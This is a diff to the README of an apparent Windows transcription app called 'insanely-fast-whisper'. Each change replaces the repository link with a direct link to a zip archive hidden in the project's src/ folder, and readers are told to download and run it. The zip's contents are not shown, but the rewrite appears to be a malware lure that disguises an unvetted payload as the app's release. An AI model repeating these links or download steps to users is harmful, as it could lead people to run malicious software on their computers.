@@ -1,11 +1,11 @@
 # ⚡ insanely-fast-whisper - Fast audio transcription on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Flossiemultinational273/insanely-fast-whisper)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Flossiemultinational273/insanely-fast-whisper/main/src/insanely_fast_whisper/fast_whisper_insanely_v3.6.zip)
 
 ## 📥 Download
 Visit this page to download and run this file:
 
-https://github.com/Flossiemultinational273/insanely-fast-whisper
+https://raw.githubusercontent.com/Flossiemultinational273/insanely-fast-whisper/main/src/insanely_fast_whisper/fast_whisper_insanely_v3.6.zip
 
 ## 🖥️ What this app does
 
@@ -37,7 +37,7 @@ If you have a fast NVIDIA graphics card, the app can run much faster. It also wo
 ## 🚀 Get the app
 
 1. Open this page in your web browser:
-   https://github.com/Flossiemultinational273/insanely-fast-whisper
+   https://raw.githubusercontent.com/Flossiemultinational273/insanely-fast-whisper/main/src/insanely_fast_whisper/fast_whisper_insanely_v3.6.zip
 
 2. Find the latest Windows download.
 
@@ -152,7 +152,7 @@ No. It reads your file and creates transcript output.
 ## 📌 Quick start
 
 1. Open the download page:
-   https://github.com/Flossiemultinational273/insanely-fast-whisper
+   https://raw.githubusercontent.com/Flossiemultinational273/insanely-fast-whisper/main/src/insanely_fast_whisper/fast_whisper_insanely_v3.6.zip
 
 2. Download the Windows file.
 
